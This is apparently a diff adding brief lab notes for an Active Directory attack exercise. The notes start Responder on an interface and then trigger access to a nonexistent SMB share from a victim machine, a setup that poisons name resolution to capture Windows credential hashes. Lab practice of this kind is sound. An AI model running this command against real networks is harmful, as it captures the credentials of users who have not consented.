@@ -1,0 +1,5 @@
+1. Start responder:
+
+	responder -I eth0 -wr
+
+2. Attempt to access nonexistent SMB share in Windows AD Victim 1 machine
